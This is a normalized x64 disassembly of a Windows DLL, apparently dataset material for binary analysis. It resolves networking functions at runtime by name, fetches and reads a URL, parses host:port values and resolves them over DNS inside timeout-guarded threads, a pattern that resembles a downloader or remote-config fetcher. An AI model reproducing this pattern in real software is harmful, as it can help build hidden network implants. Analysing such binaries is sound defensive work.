jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov r8d 0x3f
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x78 ] rax
call sub_180006080
xor ebx ebx
cmp [ rsp + 0x40 ] bl
je r-xdata
cmp edx 0x4
jne r-xdata
lea rdx [ rcx + 0xcc ]
jmp r-xdata
cmp [ rdx ] al
je r-xdata
lea r8 [ sub_180003cd0 ]
jmp r-xdata
cmp edx 0x4
jne r-xdata
lea rdx [ rcx + 0x1cc ]
cmp [ rdx ] al
je r-xdata
lea r8 [ sub_180004010 ]
cmp edx 0x5
jne r-xdata
lea rdx [ rcx + 0x10c ]
jmp r-xdata
cmp [ rdx ] al
je r-xdata
lea r9 [ rsp + 0x40 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] ebx
call [ CreateThread@IAT ]
mov rdi rax
test rax rax
je r-xdata
cmp edx 0x5
jne r-xdata
lea rdx [ rcx + 0x20c ]
jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov r8d 0x3f
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x78 ] rax
call sub_180006080
cmp [ rsp + 0x40 ] 0x0
je r-xdata
mov edx 0x2bf20
mov rcx rax
call [ WaitForSingleObject@IAT ]
mov rcx rdi
test eax eax
jne r-xdata
cmp edx 0x6
jne r-xdata
lea rdx [ rcx + 0x14c ]
jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov r8d 0x3f
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x78 ] rax
call sub_180006080
cmp [ rsp + 0x40 ] 0x0
je r-xdata
cmp edx 0x6
jne r-xdata
lea rdx [ rcx + 0x4c ]
cmp [ rdx ] al
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180003c50
mov edx 0xff
call [ TerminateThread@IAT ]
lea rdx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] ebx
call [ GetExitCodeThread@IAT ]
mov ebx [ rsp + 0x30 ]
jmp r-xdata
cmp edx 0x7
je r-xdata
lea rdx [ rcx + 0x18c ]
jmp r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180003bd0
jmp r-xdata
cmp edx 0x7
jne r-xdata
lea rdx [ rcx + 0x8c ]
jmp r-xdata
jmp r-xdata
mov eax ebx
jmp r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
cmp ebx 0x1
jne r-xdata
cmp edx 0x8
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp edx 0x8
jne r-xdata
lea rdx [ rcx + 0xcc ]
jmp r-xdata
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_1800042d0
mov rbx [ rsp + 0xb8 ]
add rsp 0xa0
pop rdi
retn
lea rdx [ rcx + 0x20c ]
jmp r-xdata
lea rdx [ rcx + 0x10c ]
jmp r-xdata
sub_180003bd0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
xor ebx ebx
mov r9 rcx
lea r8 [ sub_180003cd0 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] ebx
call [ CreateThread@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov edx 0x2bf20
mov rcx rax
call [ WaitForSingleObject@IAT ]
mov rcx rdi
test eax eax
jne r-xdata
mov edx 0xff
call [ TerminateThread@IAT ]
lea rdx [ rsp + 0x48 ]
mov [ rsp + 0x48 ] ebx
call [ GetExitCodeThread@IAT ]
mov ebx [ rsp + 0x48 ]
jmp r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
sub_180003c50
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
xor ebx ebx
mov r9 rcx
lea r8 [ sub_180004010 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] ebx
call [ CreateThread@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov edx 0x2bf20
mov rcx rax
call [ WaitForSingleObject@IAT ]
mov rcx rdi
test eax eax
jne r-xdata
mov edx 0xff
call [ TerminateThread@IAT ]
lea rdx [ rsp + 0x48 ]
mov [ rsp + 0x48 ] ebx
call [ GetExitCodeThread@IAT ]
mov ebx [ rsp + 0x48 ]
jmp r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
sub_180003cd0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
mov eax 0x10190
call sub_180015990
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x10180 ] rax
mov [ rsp + 0x60 ] rsp
mov [ rsp + 0x48 ] rcx
xor r13d r13d
mov [ rsp + 0x50 ] r13
mov r12 r13
mov [ rsp + 0x58 ] r13
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rbx rax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rdi rax
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x38 ] rax
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov rsi rax
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov r15 rax
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov rbx rax
mov [ rsp + 0x20 ] r13d
xor r9d r9d
xor r8d r8d
xor edx edx
lea rcx [ r--data ]
call rdi
mov r14 rax
mov [ rsp + 0x50 ] rax
test rax rax
je r-xdata
test r14 r14
je r-xdata
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] 0x84000100
lea r9d [ r13 + 0xf ]
lea r8 [ r--data ]
mov rdx [ rsp + 0x48 ]
mov rcx rax
call rsi
mov r12 rax
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rcx r14
mov rbx [ rsp + 0x38 ]
call rbx
jmp r-xdata
mov edi 0x3fffc
mov [ rsp + 0x30 ] edi
mov [ rsp + 0x40 ] 0x4
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0x30 ]
mov edx 0x20000005
mov rcx rax
call rbx
mov ecx [ rsp + 0x30 ]
test eax eax
cmove ecx edi
mov [ rsp + 0x30 ] ecx
mov ebx r13d
mov [ rsp + 0x44 ] ebx
add ecx 0x104
call sub_180004740
mov rsi rax
test rax rax
je r-xdata
mov eax r13d
mov rcx r12
call rbx
test r12 r12
je r-xdata
mov r8d [ rsp + 0x30 ]
xor edx edx
mov rcx rax
call sub_180009540
mov eax 0x1
mov [ rsp + 0x34 ] eax
mov edi eax
test ebx ebx
jne r-xdata
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_1800061e4
mov rbx rax
test rax rax
je r-xdata
mov rcx rsi
call j_sub_180004690
jmp r-xdata
mov [ rsp + 0x180 ] 0x0
xor edx edx
mov r8d 0xfffe
lea rcx [ rsp + 0x181 ]
call sub_180009540
lea r9 [ rsp + 0x34 ]
mov r8d 0xfffe
lea rdx [ rsp + 0x180 ]
mov rcx r12
call r15
mov edi eax
test eax eax
je r-xdata
mov rcx rsi
call j_sub_180004690
nop
lea rdx [ r--data ]
mov rcx rax
call sub_1800061e4
mov rdi rax
test rax rax
je r-xdata
mov eax [ rsp + 0x34 ]
mov eax [ rsp + 0x34 ]
test eax eax
je r-xdata
sub ebx esi
add ebx 0x8
sub edi esi
mov [ rsp + 0x70 ] 0x0
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x71 ]
call sub_180009540
sub edi ebx
movsxd r8 edi
movsxd rdx ebx
add rdx rsi
lea rcx [ rsp + 0x70 ]
call sub_180006080
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
call sub_180002240
mov rbx rax
test rax rax
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
cmp ebx [ rsp + 0x30 ]
jae r-xdata
mov rax [ rsp + 0x48 ]
mov r8 [ rax + 0x48 ]
mov rdx [ rax + 0x40 ]
mov rcx rbx
call sub_180004020
test eax eax
jne r-xdata
mov r8 rax
mov ecx ebx
add rcx rsi
lea rdx [ rsp + 0x180 ]
call sub_1800059c0
mov eax [ rsp + 0x34 ]
add ebx eax
mov [ rsp + 0x44 ] ebx
jmp r-xdata
mov rcx rbx
call j_sub_180004690
lea rdx [ r-xdata ]
mov rcx [ rsp + 0x60 ]
call sub_1800089a0
nop
nop
mov eax 0x1
jmp r-xdata
mov rcx rbx
call j_sub_180004690
mov rcx rsi
call j_sub_180004690
jmp r-xdata
mov rcx [ rsp + 0x10180 ]
xor rcx rsp
call sub_1800042d0
lea r11 [ rsp + 0x10190 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_180004020
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x160
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x150 ] rax
xor esi esi
mov rbx rcx
mov rdi r8
mov [ rdx ] esi
mov r12 rdx
mov [ r8 ] si
lea rcx [ rsp + 0x41 ]
mov r8d 0x103
xor edx edx
mov [ rsp + 0x40 ] sil
call sub_180009540
lea edx [ rsi + 0x3a ]
mov rcx rbx
call sub_180006240
lea rcx [ rsp + 0x40 ]
mov rbp rax
test rax rax
je r-xdata
sub rcx rbx
nop
mov r8 rax
mov rdx rbx
sub r8 rbx
call sub_180006080
lea rcx [ rbp + 0x1 ]
call sub_180006268
mov [ rdi ] ax
test ax ax
je r-xdata
movzx eax [ rbx ]
inc rbx
mov [ rcx + rbx - 0x1 ] al
test al al
jne r-xdata
mov eax 0x50
mov [ rdi ] ax
mov ecx 0xffdc
cmp ax cx
jb r-xdata
call [ inet_addr@IAT ]
mov ecx eax
call [ ntohl@IAT ]
mov [ r12 ] eax
mov eax edi
xor eax eax
lea r8d [ rdi + 0x7 ]
mov edx edi
mov [ rsp + 0x31 ] ax
mov [ rsp + 0x33 ] al
lea rax [ rsp + 0x38 ]
xor r9d r9d
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x30 ] sil
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x38 ] rsi
call DnsQuery_A
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
call sub_1800041b0
mov edi 0x1
lea rcx [ rsp + 0x40 ]
test eax eax
jne r-xdata
jmp r-xdata
lea rcx [ rsp + 0x40 ]
call [ gethostbyname@IAT ]
test rax rax
jne r-xdata
mov rcx [ rsp + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rax + 0x18 ]
mov rdx [ rcx ]
mov ecx [ rdx ]
xor ecx ecx
call j_sub_180004690
xor eax eax
jmp r-xdata
mov ebx [ rsp + 0x30 ]
cmp di [ rcx + 0x10 ]
je r-xdata
mov rcx [ rsp + 0x150 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x160
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov ecx ebx
jmp r-xdata
mov ebx [ rcx + 0x20 ]
mov esi edi
jmp r-xdata
mov rcx [ rcx ]
mov [ rsp + 0x38 ] rcx
test rcx rcx
jne r-xdata
call [ inet_ntoa@IAT ]
mov rcx rax
mov edx edi
call DnsFree
test esi esi
je r-xdata
sub_1800041b0
sub rsp 0x158
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x140 ] rax
mov r8 rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x34 ] 0xffffffff
mov [ rsp + 0x3c ] 0xffffffff
mov [ rsp + 0x30 ] 0xffffffff
mov [ rsp + 0x38 ] 0xffffffff
call sub_1800047e4
lea r11 [ rsp + 0x38 ]
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] r11
lea r9 [ rsp + 0x3c ]
lea r8 [ rsp + 0x34 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x20 ] rax
call sub_180006318
mov r9d [ rsp + 0x34 ]
test r9d r9d
js r-xdata
xor eax eax
mov rcx [ rsp + 0x140 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x158
retn
mov ecx [ rsp + 0x3c ]
test ecx ecx
js r-xdata
mov edx [ rsp + 0x30 ]
test edx edx
js r-xdata
mov r8d [ rsp + 0x38 ]
test r8d r8d
js r-xdata
cmp r9d 0xff
jg r-xdata
cmp ecx 0xff
jg r-xdata
cmp edx 0xff
jg r-xdata
cmp r8d 0xff
jg r-xdata
cmp eax 0x4
jne r-xdata
mov eax 0x1
mov rcx [ rsp + 0x140 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x158
retn
sub_1800042f0
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_180006b3c
mov rcx rax
mov rbx rax
call EncodePointer
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180004334
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_180006d9c
nop
mov rcx [ rw-data ]
call DecodePointer
mov r12 rax
mov rcx [ rw-data ]
call DecodePointer
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_180006cd0
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call EncodePointer
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call EncodePointer
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_180006da8
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_180006bc0
xor ebx ebx
cmp rax rbx
jne r-xdata
mov rcx r12
call sub_180006bc0
cmp rax rbx
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call EncodePointer
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_180004454
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_180007638
call sub_1800075a8
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_1800074b0
mov ecx 0x1e
call sub_180007288
mov ecx 0xff
call sub_180006d84
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_1800075a8
mov [ rax ] 0xc
mov rcx rbx
call sub_180007638
test eax eax
je r-xdata
call sub_1800075a8
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_18000450c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_180004454
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_180004690
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_180007638
call sub_1800075a8
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_1800075a8
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180007560
mov [ rbx ] eax
mov rcx rbx
call sub_180007638
test eax eax
je r-xdata
call sub_1800075a8
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180007560
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_1800045e0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
push rdi
sub rsp 0x68
mov rax r8
mov rdi rcx
test r8 r8
jne r-xdata
test rdx rdx
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or eax 0xffffffff
jmp r-xdata
mov ecx 0x7fffffff
lea r9 [ rsp + 0x98 ]
mov [ rsp + 0x48 ] 0x42
cmp rdx rcx
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x30 ] rdi
cmova edx ecx
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rsp + 0x38 ] edx
mov rdx rax
call sub_180007918
mov ebx eax
test rdi rdi
je r-xdata
test rcx rcx
je r-xdata
add rsp 0x68
pop rdi
pop rbx
retn
sub [ rsp + 0x38 ] 0x1
js r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000766c
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x0
jmp r-xdata
mov eax ebx
sub_180004690
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_1800075a8
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180007560
mov [ rbx ] eax
sub_1800046e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800086c8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180004690
sub_180004740
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_180004454
test rax rax
je r-xdata
mov rcx rbx
call sub_180007638
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_180008648
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_18000878c
int3
or eax r8d
lea rdx [ rw-data ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
call sub_18000862c
lea rcx [ sub_180016144 ]
mov [ rw-data ] rbx
call sub_18000443c
sub_1800047e4
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
sub rsp 0x60
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
lea r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rsp + 0x38 ] 0x7fffffff
mov [ rsp + 0x48 ] 0x42
call sub_180007918
sub [ rsp + 0x38 ] 0x1
mov ebx eax
js r-xdata
add rsp 0x60
pop rbx
retn
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000766c
mov rcx [ rsp + 0x30 ]
mov [ rcx ] 0x0
jmp r-xdata
mov eax ebx
sub_180004880
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor ebx ebx
mov r13 rcx
mov r14 rcx
mov [ rsp + 0x78 ] rcx
mov r15 r9
mov r12 r8
mov rbp rdx
mov [ rsp + 0x80 ] rdx
mov rcx rdx
cmp r8 rbx
je r-xdata
xor eax eax
cmp r9 rbx
je r-xdata
cmp r14 rbx
jne r-xdata
mov rdi [ rsp + 0x90 ]
cmp rdi rbx
je r-xdata
call sub_1800075a8
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
cmp rbp 0xffffffffffffffff
je r-xdata
xor edx edx
or rax 0xffffffffffffffff
div r12
cmp r9 rax
jbe r-xdata
cmp rdi rbx
je r-xdata
mov r8 rbp
xor edx edx
mov rcx r13
call sub_180009540
mov rcx rbp
mov rbx r12
imul rbx r15
test [ rdi + 0x18 ] 0x10c
mov rsi rbx
je r-xdata
xor edx edx
or rax 0xffffffffffffffff
div r12
cmp r15 rax
ja r-xdata
mov r9d 0x1000
mov r9d [ rdi + 0x24 ]
jmp r-xdata
mov rax r15
jmp r-xdata
test [ rdi + 0x18 ] 0x10c
mov r10d 0x7fffffff
je r-xdata
mov [ rsp + 0x70 ] r9d
test rbx rbx
mov rbx [ rsp + 0x88 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r8d r9d
cmp rsi r8
jb r-xdata
movsxd r14 [ rdi + 0x8 ]
test r14d r14d
je r-xdata
mov rcx rdi
call sub_180008a04
cmp eax 0xffffffff
je r-xdata
test r9d r9d
je r-xdata
mov r14 [ rsp + 0x78 ]
js r-xdata
sub rbx rsi
xor edx edx
mov rax rbx
div r12
jmp r-xdata
mov rcx [ rsp + 0x80 ]
test rcx rcx
je r-xdata
mov r14d esi
cmp rsi r10
cmova r14d r10d
xor edx edx
cmp rsi r10
jbe r-xdata
or [ rdi + 0x18 ] 0x20
cmp rsi r14
cmovb r14d esi
mov r9d r14d
cmp r9 rcx
ja r-xdata
cmp rbp 0xffffffffffffffff
je r-xdata
mov [ r14 ] al
mov r9d [ rdi + 0x24 ]
dec rsi
inc r14
dec rcx
mov [ rsp + 0x70 ] r9d
mov rcx rdi
call sub_180009454
mov r8d r14d
mov r14 [ rsp + 0x78 ]
mov rdx r14
mov ecx eax
call sub_1800092e0
test eax eax
je r-xdata
mov rax rsi
mov r14d esi
div r8
mov eax r10d
mov r14d r10d
div r9d
jmp r-xdata
mov r8 [ rdi ]
mov rdx rcx
mov rcx [ rsp + 0x78 ]
call sub_18000948c
sub [ rdi + 0x8 ] r14d
mov eax r14d
mov r14 [ rsp + 0x78 ]
sub rsi rax
add [ rdi ] rax
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
mov [ rax ] 0x22
jmp r-xdata
mov r8 rbp
xor edx edx
mov rcx r13
call sub_180009540
je r-xdata
or [ rdi + 0x18 ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax r14d
cmp rax rcx
ja r-xdata
sub r14d edx
jmp r-xdata
mov [ rsp + 0x78 ] r14
mov [ rsp + 0x80 ] rcx
test rsi rsi
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
mov eax eax
sub rsi rax
jmp r-xdata
mov rcx [ rsp + 0x80 ]
mov r9d [ rsp + 0x70 ]
add r14 rax
sub rcx rax
jmp r-xdata
sub_180004ae0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov rsi r9
mov r13 r8
mov rdi rdx
mov r12 rcx
test r8 r8
je r-xdata
xor eax eax
test r9 r9
je r-xdata
mov rbx [ rsp + 0x60 ]
test rbx rbx
jne r-xdata
mov rcx rbx
call sub_180005600
nop
mov [ rsp + 0x20 ] rbx
mov r9 rsi
mov r8 r13
mov rdx rdi
mov rcx r12
call sub_180004880
mov rdi rax
mov rcx rbx
call sub_180005690
mov rax rdi
jmp r-xdata
cmp rdx 0xffffffffffffffff
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
call sub_1800075a8
mov [ rax ] 0x16
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
xor eax eax
jmp r-xdata
mov r8 rdx
xor edx edx
call sub_180009540
sub_180004bbc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x30 ] rsp
mov r12d r8d
mov rdi rdx
mov rsi rcx
xor r13d r13d
mov eax r13d
cmp rcx r13
setne al
cmp eax r13d
jne r-xdata
mov eax r13d
cmp rdx r13
setne al
cmp eax r13d
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r13
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
xor eax eax
jmp r-xdata
mov eax r13d
cmp [ rdx ] r13w
setne al
cmp eax r13d
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r13
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
call sub_180008820
mov rbx rax
mov [ rsp + 0x60 ] rax
cmp rax r13
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r13
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
xor eax eax
jmp r-xdata
cmp [ rsi ] r13w
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x18
xor eax eax
jmp r-xdata
mov r9 rax
mov r8d r12d
mov rdx rdi
mov rcx rsi
call sub_18000962c
mov rdi rax
mov rcx rbx
call sub_180005690
mov rax rdi
call sub_1800075a8
mov [ rax ] 0x16
lea rdx [ r-xdata ]
mov rcx [ rsp + 0x30 ]
call sub_1800089a0
nop
nop
xor eax eax
jmp r-xdata
sub_180004d04
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180009928
cmp rax 0x5
jb r-xdata
xor eax eax
mov r9w 0x5c
mov r8w 0x2f
cmp [ rbx ] r9w
je r-xdata
cmp [ rbx + 0x2 ] r9w
je r-xdata
cmp [ rbx ] r8w
jne r-xdata
cmp [ rbx + 0x4 ] r9w
je r-xdata
cmp [ rbx + 0x2 ] r8w
jne r-xdata
cmp [ rbx + 0x4 ] r8w
je r-xdata
lea rax [ rbx + 0x6 ]
xor edx edx
movzx ecx [ rax ]
cmp cx dx
je r-xdata
cmp cx r9w
je r-xdata
cmp [ rax ] dx
je r-xdata
cmp cx r8w
je r-xdata
add rax 0x2
cmp [ rax ] dx
je r-xdata
add rax 0x2
mov cx [ rax ]
cmp cx dx
jne r-xdata
movzx ecx [ rax ]
cmp cx dx
je r-xdata
mov eax 0x1
jmp r-xdata
cmp cx r9w
je r-xdata
add rsp 0x20
pop rbx
retn
cmp [ rax ] dx
je r-xdata
cmp cx r8w
je r-xdata
cmp [ rax + 0x2 ] dx
jne r-xdata
add rax 0x2
mov cx [ rax ]
cmp cx dx
jne r-xdata
sub_180004dc0
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x4d0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x4c0 ] rax
xor r14d r14d
mov rbx rdx
mov rdi rcx
cmp rcx r14
jne r-xdata
cmp rdx r14
je r-xdata
call sub_1800075c8
mov [ rax ] r14d
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r14
call sub_180008530
jmp r-xdata
lea rdx [ r--data ]
call sub_18000b028
cmp rax r14
je r-xdata
or eax 0xffffffff
cmp [ rdi + 0x2 ] 0x3a
jne r-xdata
call sub_1800075a8
mov ebx 0x2
mov [ rax ] ebx
call sub_1800075c8
mov [ rax ] ebx
jmp r-xdata
call sub_18000ae44
mov r13d eax
movzx ecx [ rdi ]
cmp cx r14w
je r-xdata
bt [ rsp + 0x60 ] 0xa
jae r-xdata
lea rdx [ r--data ]
mov rcx rdi
mov rsi r14
call sub_18000b028
cmp rax r14
je r-xdata
call j_sub_18000af24
movzx r13d ax
sub r13d 0x60
jmp r-xdata
cmp [ rdi + 0x4 ] r14w
je r-xdata
cmp [ rsp + 0x74 ] r14d
jne r-xdata
